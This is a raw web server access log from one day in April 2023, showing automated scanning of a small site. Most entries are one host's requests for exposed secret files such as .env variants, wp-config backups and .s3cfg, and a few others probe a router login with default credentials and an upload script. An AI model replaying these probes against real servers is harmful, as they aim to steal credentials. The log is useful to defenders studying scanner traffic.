localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:40 +0000] "GET /wp-config.php.save HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:40 +0000] "GET /wp-config.php_ HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:40 +0000] "GET /wp-config.php_bk HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:41 +0000] "GET /wp-config.php_old HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:41 +0000] "GET /wp-config.php_orig HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:41 +0000] "GET /wp-config.php~ HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:42 +0000] "GET /.docker/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:42 +0000] "GET /.docker/laravel/app/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:43 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:43 +0000] "GET /.env.backup HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:43 +0000] "GET /.env.dev HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:44 +0000] "GET /.env.dist HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:44 +0000] "GET /.env.example HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:44 +0000] "GET /.env.local HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:45 +0000] "GET /.env.save HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:45 +0000] "GET /.env.stage HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:45 +0000] "GET /.env.www HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:46 +0000] "GET /.env_1 HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:46 +0000] "GET /.envs HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:47 +0000] "GET /.env~ HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:47 +0000] "GET /.gitlab-ci/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:47 +0000] "GET /.s3cfg HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:48 +0000] "GET /.vscode/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:48 +0000] "GET /admin-app/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:48 +0000] "GET /admin/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:49 +0000] "GET /alpha/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:49 +0000] "GET /api/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:49 +0000] "GET /api/src/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:50 +0000] "GET /apis/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:50 +0000] "GET /app/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:51 +0000] "GET /app/config/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:51 +0000] "GET /app/config/dev/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:51 +0000] "GET /apps/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:52 +0000] "GET /assets/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:52 +0000] "GET /back/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:52 +0000] "GET /backend/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:53 +0000] "GET /beta/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:53 +0000] "GET /blog/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:53 +0000] "GET /bootstrap/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:54 +0000] "GET /client/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:54 +0000] "GET /config.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:55 +0000] "GET /config/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:55 +0000] "GET /content/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:55 +0000] "GET /core/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:56 +0000] "GET /cp/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:56 +0000] "GET /crm/.env.production HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:56 +0000] "GET /d/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:57 +0000] "GET /demo/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:57 +0000] "GET /dev/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:57 +0000] "GET /development/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:58 +0000] "GET /docs/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:58 +0000] "GET /download/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:59 +0000] "GET /en/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:59 +0000] "GET /env/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:31:59 +0000] "GET /environment HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:00 +0000] "GET /envrc HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:00 +0000] "GET /export/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:00 +0000] "GET /files/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:01 +0000] "GET /home/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:01 +0000] "GET /icons/.env HTTP/1.1" 404 491 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:02 +0000] "GET /images/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:02 +0000] "GET /img/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:02 +0000] "GET /kyc/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:03 +0000] "GET /laravel/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:03 +0000] "GET /laravel/core/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:03 +0000] "GET /lib/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:04 +0000] "GET /live/.env.staging HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:04 +0000] "GET /local/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:04 +0000] "GET /login/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:05 +0000] "GET /mailer/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:05 +0000] "GET /manual/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:06 +0000] "GET /media/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:06 +0000] "GET /private/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:06 +0000] "GET /prod/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:07 +0000] "GET /public/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:07 +0000] "GET /results/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:07 +0000] "GET /script/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:08 +0000] "GET /scripts/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:08 +0000] "GET /server/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:08 +0000] "GET /services/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:09 +0000] "GET /shared/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:09 +0000] "GET /site/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:10 +0000] "GET /src/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:10 +0000] "GET /staging/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:10 +0000] "GET /static/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:11 +0000] "GET /storage/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:11 +0000] "GET /system/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:11 +0000] "GET /test/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:12 +0000] "GET /uploads/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:12 +0000] "GET /v2/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:12 +0000] "GET /web/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:13 +0000] "GET /website/.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 54.254.246.244 - - [28/Apr/2023:04:32:13 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 193.32.162.159 - - [28/Apr/2023:04:40:39 +0000] "GET / HTTP/1.1" 200 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 138.197.12.163 - - [28/Apr/2023:04:50:07 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 138.197.12.163 - - [28/Apr/2023:04:50:07 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 138.197.12.163 - - [28/Apr/2023:04:50:07 +0000] "GET / HTTP/1.1" 200 382 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
localhost:80 138.197.12.163 - - [28/Apr/2023:04:50:08 +0000] "GET /client/get_targets HTTP/1.1" 404 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
localhost:80 138.197.12.163 - - [28/Apr/2023:04:50:08 +0000] "GET /upl.php HTTP/1.1" 404 226 "-" "Mozilla/5.0"
localhost:80 138.197.12.163 - - [28/Apr/2023:04:50:08 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 138.197.12.163 - - [28/Apr/2023:04:50:08 +0000] "GET /geoip/ HTTP/1.1" 301 439 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
localhost:80 138.197.12.163 - - [28/Apr/2023:04:50:08 +0000] "GET / HTTP/1.1" 200 382 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.0.54 (like Safari/604.1)"
localhost:80 138.197.12.163 - - [28/Apr/2023:04:50:09 +0000] "GET /favicon.ico HTTP/1.1" 200 5676 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
localhost:80 172.105.128.12 - - [28/Apr/2023:04:58:54 +0000] "\x16\x03\x01" 400 483 "-" "-"
localhost:80 43.154.128.189 - - [28/Apr/2023:05:07:10 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 205.210.31.3 - - [28/Apr/2023:05:23:47 +0000] "GET / HTTP/1.0" 200 373 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
localhost:80 198.199.97.57 - - [28/Apr/2023:05:34:45 +0000] "MGLNDD_54.155.101.2_80\n" 400 483 "-" "-"
localhost:80 193.32.162.159 - - [28/Apr/2023:06:07:58 +0000] "GET / HTTP/1.1" 200 436 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
localhost:80 43.154.128.189 - - [28/Apr/2023:06:25:56 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
localhost:80 135.125.246.110 - - [28/Apr/2023:06:41:48 +0000] "POST / HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 135.125.246.110 - - [28/Apr/2023:06:41:48 +0000] "GET /.env HTTP/1.1" 404 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
localhost:80 123.129.153.145 - - [28/Apr/2023:06:44:24 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 245 "-" "-"
localhost:80 154.209.125.66 - - [28/Apr/2023:06:48:17 +0000] "GET / HTTP/1.1" 200 410 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
localhost:80 5.188.210.227 - - [28/Apr/2023:07:22:03 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 245 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
localhost:80 198.235.24.195 - - [28/Apr/2023:07:35:38 +0000] "GET / HTTP/1.1" 200 354 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
